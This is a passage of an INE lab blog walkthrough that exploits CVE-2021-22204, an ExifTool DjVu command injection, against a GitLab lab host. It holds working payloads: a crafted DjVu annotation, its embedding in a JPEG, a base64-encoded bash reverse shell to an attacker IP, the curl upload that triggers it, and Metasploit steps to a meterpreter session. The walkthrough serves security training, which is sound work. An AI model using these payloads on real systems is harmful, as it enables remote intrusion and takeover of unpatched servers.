machine\u003c/strong\u003e\u003c/p\u003e\u003cimg src=\"https://us-east-1.graphassets.com/AwCYQkwjSUCbfkm08Ct1Mz/lAjdJ2oQ8KjrcqVWzn2E\" alt=\"ExifTool_1.png\" title=\"ExifTool_1.png\" width=\"2560\" height=\"1375\" /\u003e\u003cp\u003e\u003cstrong\u003eStep 2:\u003c/strong\u003e Check if the provided machine/domain is reachable.\u003c/p\u003e\u003cp\u003e\u003cstrong\u003eCommand\u003c/strong\u003e\u003c/p\u003e\u003cp\u003eping -c 4 demo.ine.local\u003c/p\u003e\u003cimg src=\"https://us-east-1.graphassets.com/AwCYQkwjSUCbfkm08Ct1Mz/yQz0givnQB6OJllrPdy6\" alt=\"ExifTool_2.jpg\" title=\"ExifTool_2.jpg\" width=\"1040\" height=\"320\" /\u003e\u003cp\u003eThe provided machine is reachable, and we also found the target\u0026#39;s IP address.\u003c/p\u003e\u003cp\u003e\u003cstrong\u003eStep 3:┬á\u003c/strong\u003eCheck all open ports on the machine.\u003c/p\u003e\u003cp\u003e\u003cstrong\u003eCommand\u003c/strong\u003e\u003c/p\u003e\u003cp\u003enmap demo.ine.local\u003c/p\u003e\u003cimg src=\"https://us-east-1.graphassets.com/AwCYQkwjSUCbfkm08Ct1Mz/NP7KqcKWTqyYryUZSxfM\" alt=\"ExifTool_3.jpg\" title=\"ExifTool_3.jpg\" width=\"900\" height=\"325\" /\u003e\u003cp\u003eMultiple ports are open. The GitLab server is running on port 80.\u003c/p\u003e\u003cp\u003e\u003cstrong\u003eStep 4:┬á\u003c/strong\u003eRun the firefox browser and access port 80 to identify the GitLab server.\u003c/p\u003e\u003cp\u003e\u003cstrong\u003eURL:\u003c/strong\u003e http://demo.ine.loca\u003c/p\u003e\u003cimg src=\"https://us-east-1.graphassets.com/AwCYQkwjSUCbfkm08Ct1Mz/WzZIOtmcRn2SjQvu2wep\" alt=\"ExifTool_4.jpg\" title=\"ExifTool_4.jpg\" width=\"1920\" height=\"961\" /\u003e\u003cp\u003e\u003cbr\u003eThe target is running the Gitlab server.\u003c/p\u003e\u003cp\u003e\u003c/p\u003e\u003ch3\u003e\u003cstrong\u003eExploiting Manually\u003c/strong\u003e\u003c/h3\u003e\u003cp\u003e\u003cstrong\u003eStep 5:\u003c/strong\u003e \u003c/p\u003e\u003cp\u003eWe will manually exploit the vulnerability by generating the malicious .jpg image.\u003c/p\u003e\u003cp\u003eTo trigger the vulnerable function, we need to create a valid DjVu file that contains an annotation chunk with the payload that will be executed by the eval function as Perl code. To create this valid DjVu file, we used the tool djvumake , from the [djvulibre](http://djvu.sourceforge.net/) toolkit. A toolkit for DjVu file manipulation. We will also use the tool bzz to compress our payload, then it will not be easily visible in the DjVu file. (in case someone try to inspect it)\u003c/p\u003e\u003cp\u003eSource: https://blog.convisoappsec.com/en/a-case-study-on-cve-2021-22204-exiftool-rce/\u003c/p\u003e\u003cp\u003eWe will generate a malicious .jpg file on the Kali machine. A vulnerable ExifTool application is installed on the Kali machine to understand how the exploit/vulnerability is working.┬á\u003c/p\u003e\u003cp\u003eFirst, we will try on the Kali machine; then, we will exploit Gitlab, which is using a vulnerable version of ExifTool.┬á\u003c/p\u003e\u003cp\u003eCreate a payload file with the below content in it.\u003c/p\u003e\u003cp\u003e\u003cstrong\u003ePayload:\u003c/strong\u003e (metadata \u0026quot;\\c${system(\u0026#39;id\u0026#39;)};\u0026quot;)\u003c/p\u003e\u003cp\u003e\u003cstrong\u003eCommands:\u003c/strong\u003e\u003c/p\u003e\u003cp\u003enano payload\u003c/p\u003e\u003cp\u003ecat payload\u003c/p\u003e\u003cimg src=\"https://us-east-1.graphassets.com/AwCYQkwjSUCbfkm08Ct1Mz/nqNGVJ8ZSq26qTR54O7O\" alt=\"ExifTool_5.jpg\" title=\"ExifTool_5.jpg\" width=\"442\" height=\"117\" /\u003e\u003cp\u003eCompress the payload file to make it non-human-readable\u003c/p\u003e\u003cp\u003e\u003cstrong\u003eCommand:\u003c/strong\u003e\u003c/p\u003e\u003cp\u003ebzz payload payload.bzz\u003c/p\u003e\u003cimg src=\"https://us-east-1.graphassets.com/AwCYQkwjSUCbfkm08Ct1Mz/Btzr7XvMRVSddwikcu27\" alt=\"ExifTool_5_1.jpg\" title=\"ExifTool_5_1.jpg\" width=\"509\" height=\"125\" /\u003e\u003cp\u003eMaking .djvu file using djvumake utility.\u003c/p\u003e\u003cp\u003e\u003cstrong\u003eCommand:\u003c/strong\u003e\u003c/p\u003e\u003cp\u003edjvumake exploit.djvu INFO=\u0026#39;1,1\u0026#39; BGjp=/dev/null ANTz=payload.bzz\u003c/p\u003e\u003cp\u003efile exploit.djvu\u003c/p\u003e\u003cp\u003e\u003cstrong\u003eINFO┬á\u003c/strong\u003e= Anything in the format \u0026#39;N,N\u0026#39; where N is a number\u003c/p\u003e\u003cp\u003e\u003cstrong\u003eBGjp┬á\u003c/strong\u003e= Expects a JPEG image, but we can use /dev/null to use nothing as a background image\u003c/p\u003e\u003cp\u003e\u003cstrong\u003eANTz┬á\u003c/strong\u003e= Will write the compressed annotation chunk with the input file\u003c/p\u003e\u003cimg src=\"https://us-east-1.graphassets.com/AwCYQkwjSUCbfkm08Ct1Mz/xEgqIObjQRixFFalprWO\" alt=\"ExifTool_5_2.jpg\" title=\"ExifTool_5_2.jpg\" width=\"1074\" height=\"126\" /\u003e\u003cp\u003eWe have successfully generated the malicious .djvu file that will execute┬á\u003cstrong\u003eid┬á\u003c/strong\u003ecommand when someone tries to analyze it with the ExifTool tool.\u003c/p\u003e\u003cp\u003eWe are running ExifTool to check the malicious file behavior.\u003c/p\u003e\u003cp\u003e\u003cstrong\u003eCommand:\u003c/strong\u003e\u003c/p\u003e\u003cp\u003eexiftool exploit.djvu┬á\u003c/p\u003e\u003cimg src=\"https://us-east-1.graphassets.com/AwCYQkwjSUCbfkm08Ct1Mz/T7lY2IIYTPO8tGWH2BkR\" alt=\"ExifTool_5_3.jpg\" title=\"ExifTool_5_3.jpg\" width=\"840\" height=\"624\" /\u003e\u003cp\u003eAs we can notice, we have successfully executed the command id while analyzing the exploit.djvu file using the ExifTool tool. This confirms that ExifTool version 12.23 is vulnerable to Command Injection vulnerability.\u003c/p\u003e\u003cp\u003e\u003cstrong\u003eStep 6:\u003c/strong\u003e Let\u0026#39;s exploit the GitLab server.\u003c/p\u003e\u003cp\u003eWe will again generate another malicious .djvu file. But, this time, we are exploiting the Gitlab server. It doesn\u0026#39;t support .djvu format file. We need an image file.┬á\u003c/p\u003e\u003cp\u003eWe can easily create a .djvu file to .jgp using the below config file.\u003c/p\u003e\u003cpre\u003e\u003ccode\u003e%Image::ExifTool::UserDefined = (\n┬á┬á┬á┬áAll EXIF tags are added to the Main table, and WriteGroup is used to\n┬á┬á┬á┬áspecify where the tag is written (default is ExifIFD if not specified):\n┬á┬á┬á┬á\u0026#39;Image::ExifTool::Exif::Main\u0026#39; =\u0026gt; {\n┬á┬á┬á┬á┬á┬á┬á┬áExample 1.┬á EXIF:NewEXIFTag\n┬á┬á┬á┬á┬á┬á┬á┬á0xc51b =\u0026gt; {\n┬á┬á┬á┬á┬á┬á┬á┬á┬á┬á┬á┬áName =\u0026gt; \u0026#39;HasselbladExif\u0026#39;,\n┬á┬á┬á┬á┬á┬á┬á┬á┬á┬á┬á┬áWritable =\u0026gt; \u0026#39;string\u0026#39;,\n┬á┬á┬á┬á┬á┬á┬á┬á┬á┬á┬á┬áWriteGroup =\u0026gt; \u0026#39;IFD0\u0026#39;,\n┬á┬á┬á┬á┬á┬á┬á┬á},\n┬á┬á┬á┬á┬á┬á┬á┬áadd more user-defined EXIF tags here...\n┬á┬á┬á┬á},\n);\n1; #end%\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eWhat this file does is make it possible for us to write a new tag on the file with the name HasselbladExif and the bytes 0xc51b to identify it inside our new file. Then we can insert it inside of any file. Then use it and our already made exploit.djvu to insert the malicious DjVu file inside a valid JPEG: https://blog.convisoappsec.com/en/a-case-study-on-cve-2021-22204-exiftool-rce/\u003c/p\u003e\u003cp\u003eGenerating a new .djvu file with Bash reverse shell in it.\u003c/p\u003e\u003cp\u003eFirst, let\u0026#39;s check the attacker\u0026#39;s machine IP address.\u003c/p\u003e\u003cp\u003e\u003cstrong\u003eCommand:\u003c/strong\u003e\u003c/p\u003e\u003cp\u003eip addr\u003c/p\u003e\u003cimg src=\"https://us-east-1.graphassets.com/AwCYQkwjSUCbfkm08Ct1Mz/9UAcxH1RShuIyaaXMtWd\" alt=\"ExifTool_6.jpg\" title=\"ExifTool_6.jpg\" width=\"1404\" height=\"463\" /\u003e\u003cp\u003eThe attacker machine IP address is: 10.10.27.3.\u003c/p\u003e\u003cp\u003e\u003cstrong\u003eNote: In your case, please remember to change the attacker machine IP address\u003c/strong\u003e\u003c/p\u003e\u003cp\u003eBash Reverse Shell: sh -i \u0026gt;\u0026amp; /dev/tcp/10.10.27.3/4444 0\u0026gt;\u0026amp;1\u003c/p\u003e\u003cp\u003eFirst, encode the shell in base64 format.\u003c/p\u003e\u003cp\u003e\u003cstrong\u003eCommand:\u003c/strong\u003e\u003c/p\u003e\u003cp\u003eecho \u0026#39;sh -i \u0026gt;\u0026amp; /dev/tcp/10.10.27.3/4444 0\u0026gt;\u0026amp;1\u0026#39; | base64┬á\u003c/p\u003e\u003cimg src=\"https://us-east-1.graphassets.com/AwCYQkwjSUCbfkm08Ct1Mz/C13Fxen7QvehWLP92VCJ\" alt=\"ExifTool_6_1.jpg\" title=\"ExifTool_6_1.jpg\" width=\"934\" height=\"92\" /\u003e\u003cp\u003e\u003cstrong\u003ePayload\u003c/strong\u003e: (metadata \u0026quot;\\c${system(\u0026#39;echo c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMjcuMy80NDQ0IDA+JjEK | base64 -d | bash\u0026#39;)};\u0026quot;)\u003c/p\u003e\u003cp\u003e\u003cstrong\u003eCommand:\u003c/strong\u003e\u003c/p\u003e\u003cp\u003enano payload\u003c/p\u003e\u003cp\u003ecat payload\u003c/p\u003e\u003cp\u003ebzz payload payload.bzz\u003c/p\u003e\u003cp\u003edjvumake exploit.djvu INFO=\u0026#39;1,1\u0026#39; BGjp=/dev/null ANTz=payload.bzz\u003c/p\u003e\u003cp\u003efile exploit.djvu\u003c/p\u003e\u003cimg src=\"https://us-east-1.graphassets.com/AwCYQkwjSUCbfkm08Ct1Mz/NtQByZ2STpKxGOLdNOOS\" alt=\"ExifTool_6_2.jpg\" title=\"ExifTool_6_2.jpg\" width=\"1485\" height=\"230\" /\u003e\u003cp\u003eNow, converting the .djvu file into .jgp\u003c/p\u003e\u003cp\u003e\u003cstrong\u003eCommand:\u003c/strong\u003e\u003c/p\u003e\u003cp\u003ecat configfile\u003c/p\u003e\u003cp\u003ecp /usr/share/wallpaper.jpg .\u003c/p\u003e\u003cp\u003eexiftool -config configfile \u0026#39;-HasselbladExif\u0026lt;=exploit.djvu\u0026#39; wallpaper.jpg\u003c/p\u003e\u003cp\u003econfigfile = The name of our configuration file;\u003c/p\u003e\u003cp\u003e-HasselbladExif = Tag name that are specified in the config file;\u003c/p\u003e\u003cp\u003eexploit.djvu = Our exploit, previously made with djvumake;\u003c/p\u003e\u003cp\u003ewallpaper.jpg = A valid JPEG file;\u003c/p\u003e\u003cimg src=\"https://us-east-1.graphassets.com/AwCYQkwjSUCbfkm08Ct1Mz/oDaeclI1Qxy2Zt8EGdkc\" alt=\"ExifTool_6_3.jpg\" title=\"ExifTool_6_3.jpg\" width=\"1220\" height=\"569\" /\u003e\u003cp\u003eStart the netcat listener on port 4444\u003c/p\u003e\u003cp\u003e\u003cstrong\u003eCommand:\u003c/strong\u003e\u003c/p\u003e\u003cp\u003enc -lvp 4444\u003c/p\u003e\u003cimg src=\"https://us-east-1.graphassets.com/AwCYQkwjSUCbfkm08Ct1Mz/NDUIQtNTn2eAwRjCWUyg\" alt=\"ExifTool_6_4.jpg\" title=\"ExifTool_6_4.jpg\" width=\"630\" height=\"150\" /\u003e\u003cp\u003eSend the payload to gain the bash shell.\u003c/p\u003e\u003cp\u003e\u003cstrong\u003eCommand:\u003c/strong\u003e\u003c/p\u003e\u003cp\u003ecurl -v -F \u0026#39;file=@/root/wallpaper.jpg\u0026#39; http://demo.ine.local/$(openssl rand -hex 8)\u003c/p\u003e\u003cimg src=\"https://us-east-1.graphassets.com/AwCYQkwjSUCbfkm08Ct1Mz/D93WWplSTWUOuhvFnjMA\" alt=\"ExifTool_6_5.jpg\" title=\"ExifTool_6_5.jpg\" width=\"962\" height=\"268\" /\u003e\u003cp\u003e\u003c/p\u003e\u003cimg src=\"https://us-east-1.graphassets.com/AwCYQkwjSUCbfkm08Ct1Mz/8ez1d6e2TIKw13f6laVI\" alt=\"ExifTool_6_6.jpg\" title=\"ExifTool_6_6.jpg\" width=\"681\" height=\"295\" /\u003e\u003cp\u003e\u003cstrong\u003eWe have received a shell.\u003c/strong\u003e\u003c/p\u003e\u003cp\u003e\u003cstrong\u003eSource:┬á\u003c/strong\u003ehttps://blog.convisoappsec.com/en/a-case-study-on-cve-2021-22204-exiftool-rce/\u003c/p\u003e\u003cp\u003e\u003c/p\u003e\u003ch3\u003e\u003cstrong\u003eExploiting Using Metasploit\u003c/strong\u003e\u003c/h3\u003e\u003cp\u003e\u003cstrong\u003eStep 7:\u003c/strong\u003e Metasploit module is available to generate the malicious image. Use the module to generate the malicious image and exploit the Gitlab server manually using curl.\u003c/p\u003e\u003cp\u003eStart the Metasploit framework and search for the ExifTool exploit module.\u003c/p\u003e\u003cp\u003e\u003cstrong\u003eCommand:\u003c/strong\u003e\u003c/p\u003e\u003cp\u003emsfconsole -q\u003c/p\u003e\u003cp\u003esearch exiftool\u003c/p\u003e\u003cimg src=\"https://us-east-1.graphassets.com/AwCYQkwjSUCbfkm08Ct1Mz/gBbQ2sEQS82GzfYYPmUC\" alt=\"ExifTool_7.jpg\" title=\"ExifTool_7.jpg\" width=\"1584\" height=\"462\" /\u003e\u003cp\u003eThere is a metasploit module available:┬á\u003cstrong\u003eexploit/unix/fileformat/exiftool_djvu_ant_perl_injection\u003c/strong\u003e\u003c/p\u003e\u003cp\u003e\u003cstrong\u003eExifTool DjVu ANT Perl injection\u003c/strong\u003e\u003c/p\u003e\u003cp\u003eThis module exploits a Perl injection vulnerability in the DjVu ANT parsing code of ExifTool versions 7.44 through 12.23 inclusive. The injection is used to execute a shell command using Perl backticks. The DjVu image can be embedded in a wrapper image using the HasselbladExif EXIF field.\u003c/p\u003e\u003cp\u003e\u003cstrong\u003eSource:┬á\u003c/strong\u003ehttps://www.rapid7.com/db/modules/exploit/unix/fileformat/exiftool_djvu_ant_perl_injection/\u003c/p\u003e\u003cp\u003eFor more understanding about the ExifTool CVE-2021-22204 - Arbitrary Code Execution: Here is an excellent blog post by [William Bowling](https://twitter.com/wcbowling): https://devcraft.io/2021/05/04/exiftool-arbitrary-code-execution-cve-2021-22204.html\u003c/p\u003e\u003cp\u003eUse the exiftool_djvu_ant_perl_injection exploit module and check all available options.\u003c/p\u003e\u003cp\u003e\u003cstrong\u003eCommands:\u003c/strong\u003e\u003c/p\u003e\u003cp\u003euse exploit/unix/fileformat/exiftool_djvu_ant_perl_injection\u003c/p\u003e\u003cp\u003eshow options\u003c/p\u003e\u003cp\u003eAll the options are already set. Start the Metasploit handler while generating the malicious image.\u003c/p\u003e\u003cp\u003eSet┬á\u003cstrong\u003eDISABLEPAYLOADHANDLER┬á\u003c/strong\u003eto┬á\u003cstrong\u003efalse,┬á\u003c/strong\u003eset┬á\u003cstrong\u003eWfsDelay┬á\u003c/strong\u003eto┬á\u003cstrong\u003e100,┬á\u003c/strong\u003eand then run the module.\u003c/p\u003e\u003cimg src=\"https://us-east-1.graphassets.com/AwCYQkwjSUCbfkm08Ct1Mz/Qk592xqmSHWmlQ30R4j0\" alt=\"ExifTool_7_1.jpg\" title=\"ExifTool_7_1.jpg\" width=\"1232\" height=\"750\" /\u003e\u003cp\u003eCheck the file details.\u003c/p\u003e\u003cp\u003e\u003cstrong\u003eCommands:\u003c/strong\u003e\u003c/p\u003e\u003cp\u003eset PAYLOAD cmd/unix/reverse_bash\u003c/p\u003e\u003cp\u003eset DISABLEPAYLOADHANDLER false\u003c/p\u003e\u003cp\u003eset WfsDelay 100\u003c/p\u003e\u003cp\u003eexploit\u003c/p\u003e\u003cp\u003eThe image is generated in the /root/.msf4/local/msf.jpg. It\u0026#39;s a JPEG image data with Exif standard.\u003c/p\u003e\u003cimg src=\"https://us-east-1.graphassets.com/AwCYQkwjSUCbfkm08Ct1Mz/6LnJNfYQDOrw2EUr7S9l\" alt=\"ExifTool_7_2.jpg\" title=\"ExifTool_7_2.jpg\" width=\"1389\" height=\"330\" /\u003e\u003cp\u003eNote: Make sure that your Metasploit handler is running\u003c/p\u003e\u003cp\u003eSend the payload to gain the meterpreter session.\u003c/p\u003e\u003cp\u003e\u003cstrong\u003eCommand:\u003c/strong\u003e\u003c/p\u003e\u003cp\u003ecurl -v -F \u0026#39;file=@/root/.msf4/local/msf.jpg\u0026#39; http://demo.ine.local/$(openssl rand -hex 8)\u003c/p\u003e\u003cimg src=\"https://us-east-1.graphassets.com/AwCYQkwjSUCbfkm08Ct1Mz/TK0imYKnT1aBbWEwAQti\" alt=\"ExifTool_7_3.jpg\" title=\"ExifTool_7_3.jpg\" width=\"1332\" height=\"327\" /\u003e\u003cp\u003e\u003cstrong\u003eReceived the meterpreter session.\u003c/strong\u003e\u003c/p\u003e\u003cimg src=\"https://us-east-1.graphassets.com/AwCYQkwjSUCbfkm08Ct1Mz/KQbhFhoQ9iwIfaRMXmrw\" alt=\"ExifTool_7_4.jpg\" title=\"ExifTool_7_4.jpg\" width=\"1453\" height=\"438\" /\u003e\u003cp\u003e\u003cstrong\u003eSuccessfully exploited the target machine.\u003c/strong\u003e\u003c/p\u003e\u003cp\u003e\u003cstrong\u003eStep 8:┬á\u003c/strong\u003eRead the flag.\u003c/p\u003e\u003cp\u003e\u003cstrong\u003eCommands:\u003c/strong\u003e\u003c/p\u003e\u003cp\u003ecd ..\u003c/p\u003e\u003cp\u003els\u003c/p\u003e\u003cp\u003ecat flag.txt\u003c/p\u003e\u003cimg src=\"https://us-east-1.graphassets.com/AwCYQkwjSUCbfkm08Ct1Mz/qKMCF2zGQ7m2bImzRFOa\" alt=\"ExifTool_8.jpg\" title=\"ExifTool_8.jpg\" width=\"463\" height=\"710\" /\u003e\u003cp\u003e\u003cstrong\u003eFLAG:┬á\u003c/strong\u003e7e9b2ed1272331cfbd2aac2e5eb3f84b\u003c/p\u003e\u003cp\u003e\u003cstrong\u003eConclusion:\u003c/strong\u003e\u003c/p\u003e\u003cp\u003eWe have successfully exploited the Gitlab server abusing exiftoolΓÇÖs vulnerability (ExifToolΓÇÖs mishandling of DjVu files) that allows an attacker to perform a command injection using a malicious image. Gitlab was not correctly validating image files that were passed to a file parser; hence, it is possible to exploit the vulnerability.┬á\u003c/p\u003e\u003cp\u003e\u003cstrong\u003eReferences\u003c/strong\u003e\u003c/p\u003e\u003col\u003e\u003cli\u003e\u003cdiv\u003e\u003cp\u003e\u003ca title=\"https://github.com/exiftool/exiftool\" href=\"https://github.com/exiftool/exiftool\"\u003e\u003cu\u003eExifTool\u003c/u\u003e\u003c/a\u003e\u003c/p\u003e\u003c/div\u003e\u003c/li\u003e\u003cli\u003e\u003cdiv\u003e\u003cp\u003e\u003ca title=\"https://about.gitlab.com\" href=\"https://about.gitlab.com\"\u003e\u003cu\u003eGitLab\u003c/u\u003e\u003c/a\u003e\u003c/p\u003e\u003c/div\u003e\u003c/li\u003e\u003cli\u003e\u003cdiv\u003e\u003cp\u003e\u003ca title=\"https://packetstormsecurity.com/files/164994/GitLab-13.10.2-Remote-Code-Execution.html\" href=\"https://packetstormsecurity.com/files/164994/GitLab-13.10.2-Remote-Code-Execution.html\"\u003e\u003cu\u003ePoC\u003c/u\u003e\u003c/a\u003e\u003c/p\u003e\u003c/div\u003e\u003c/li\u003e\u003cli\u003e\u003cdiv\u003e\u003cp\u003e\u003ca title=\"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-22204\" href=\"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-22204\"\u003e\u003cu\u003eCVE-2021-22204\u003c/u\u003e\u003c/a\u003e\u003c/p\u003e\u003c/div\u003e\u003c/li\u003e\u003c/ol\u003e\u003cp\u003e\u003cem\u003eTry this exploit for yourself! \u003c/em\u003e\u003ca rel=\"noopener ugc nofollow\" class=\"au kd\" target='_blank' title=\"https://ine.com/pricing\" href=\"https://ine.com/pricing\"\u003e\u003cem\u003eSubscribe\u003c/em\u003e\u003c/a\u003e or \u003cem\u003esign up for a┬á\u003c/em\u003e\u003ca target='_blank' title=\"https://checkout.ine.com/free-trial\" href=\"https://checkout.ine.com/free-trial\"\u003e\u003cem\u003e7-day, risk-free trial with INE\u003c/em\u003e\u003c/a\u003e\u003cem\u003e to access this lab and a robust library covering the latest in Cyber Security, Networking, Cloud, and Data Science!\u003c/em\u003e\u003c/p\u003e"},"legacyPostBody":null,"publishDate":"2022-09-21","seoslug":"exiftool-command-injection-cve-2021-22204","seotitle":"ExifTool Command Injection (CVE-2021-22204)","tags":["Cybersecurity","CyberSecurity"],"title":"ExifTool Command Injection (CVE-2021-22204)","courses":[],"learningPaths":[]}},"__N_SSG":true},"page":"/blog/[slug]","query":{"slug":"exiftool-command-injection-cve-2021-22204"},"buildId":"y3bMFBnhp87rJyTJucmbR","isFallback":false,"isExperimentalCompile":false,"gsp":true,"scriptLoader":[]}</script></body><noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-T3FRMBG"
height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript></html>
